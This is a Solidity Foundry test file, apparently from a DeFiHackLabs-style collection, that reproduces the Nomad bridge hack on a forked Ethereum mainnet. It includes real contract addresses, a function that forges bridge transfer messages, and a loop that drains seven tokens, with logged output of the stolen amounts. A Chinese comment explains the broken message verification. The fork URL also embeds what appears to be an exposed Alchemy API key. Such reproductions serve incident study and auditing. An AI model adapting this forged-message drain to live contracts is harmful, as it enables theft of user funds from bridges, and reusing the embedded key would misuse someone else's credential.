// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


import "forge-std/Test.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
//import "./interface.sol";

interface IReplica {
   function process(bytes memory _message) external returns (bool _success);
}


/*

简单来说就是 合约在升级的时候  对消息校验出问题了  任何的消息都可以把钱偷出来  无需验证 
核心是这个消息的组装   其他逻辑都比较简单  

https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/07_Analysis_nomad_bridge/
https://phalcon.xyz/tx/eth/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460


$ forge test --match-path test/Nomad_Bridge_exp.t.sol -vvv 
Running 1 test for test/Nomad_Bridge_exp.t.sol:Attacker
[PASS] testExploit() (gas: 875491)
Logs:
  [*] Stealing 628 WBTC
      Attacker balance before: 0
      Attacker balance after:  628
  [*] Stealing 22876 WETH
      Attacker balance before: 0
      Attacker balance after:  22876
  [*] Stealing 87459362 USDC
      Attacker balance before: 0
      Attacker balance after:  87459362
  [*] Stealing 8625217 USDT
      Attacker balance before: 0
      Attacker balance after:  8625217
  [*] Stealing 4533633 DAI
      Attacker balance before: 0
      Attacker balance after:  4533633
  [*] Stealing 119088 FXS
      Attacker balance before: 0
      Attacker balance after:  119088
  [*] Stealing 113403733 CQT
      Attacker balance before: 0
      Attacker balance after:  113403733

Test result: ok. 1 passed; 0 failed; finished in 42.14s

*/
contract Attacker is Test {

   address constant REPLICA = 0x5D94309E5a0090b165FA4181519701637B6DAEBA;
   address constant BRIDGE_ROUTER = 0xD3dfD3eDe74E0DCEBC1AA685e151332857efCe2d;
   address constant ERC20_BRIDGE = 0x88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3;
  
   // Nomad domain IDs
   uint32 constant ETHEREUM = 0x657468;   // "eth"
   uint32 constant MOONBEAM = 0x6265616d; // "beam"
 
   // tokens
   address[] public tokens = [
       0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
       0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
       0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
       0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
       0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
       0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0, // FRAX
       0xD417144312DbF50465b1C641d016962017Ef6240  // CQT
   ];

    function setUp() public {
       vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/qXFbrurfVJ5Le9N3T3HwEi8Wc06v0Ud3", 15_259_101);
       
       vm.label(tokens[0], "WBTC");
       vm.label(tokens[1], "WETH");
       vm.label(tokens[2], "USDC");
       vm.label(tokens[3], "USDT");
       vm.label(tokens[4], "DAI");
       vm.label(tokens[5], "FRAX");
       vm.label(tokens[6], "CQT");
    }

    function testExploit() public {
        for (uint i = 0; i < tokens.length; i++) {
           address token = tokens[i];
           uint256 amount_bridge = ERC20(token).balanceOf(ERC20_BRIDGE);
 
           console.log("[*] Stealing", amount_bridge / 10**ERC20(token).decimals(), ERC20(token).symbol() );
           console.log("    Attacker balance before:", ERC20(token).balanceOf(msg.sender));
 
           // Generate the payload with all of the tokens stored on the bridge
           bytes memory payload = genPayload(msg.sender, token, amount_bridge);
 
           bool success = IReplica(REPLICA).process(payload);
           require(success, "Failed to process the payload");
 
           console.log("    Attacker balance after: ", IERC20(token).balanceOf(msg.sender) / 10**ERC20(token).decimals());
       }
    }

    function genPayload(
       address recipient,
       address token,
       uint256 amount
   ) internal pure returns (bytes memory payload) {
       payload = abi.encodePacked(
           MOONBEAM,                           // Home chain domain
           uint256(uint160(BRIDGE_ROUTER)),    // Sender: bridge
           uint32(0),                          // Dst nonce
           ETHEREUM,                           // Dst chain domain
           uint256(uint160(ERC20_BRIDGE)),     // Recipient (Nomad ERC20 bridge)
           ETHEREUM,                           // Token domain
           uint256(uint160(token)),          // token id (e.g. WBTC)
           uint8(0x3),                         // Type - transfer
           uint256(uint160(recipient)),      // Recipient of the transfer
           uint256(amount),                  // Amount
           uint256(0)                          // Optional: Token details hash
                                               // keccak256(                 
                                               //     abi.encodePacked(
                                               //         bytes(tokenName).length,
                                               //         tokenName,
                                               //         bytes(tokenSymbol).length,
                                               //         tokenSymbol,
                                               //         tokenDecimals
                                               //     )
                                               // )
       );
   }
}

 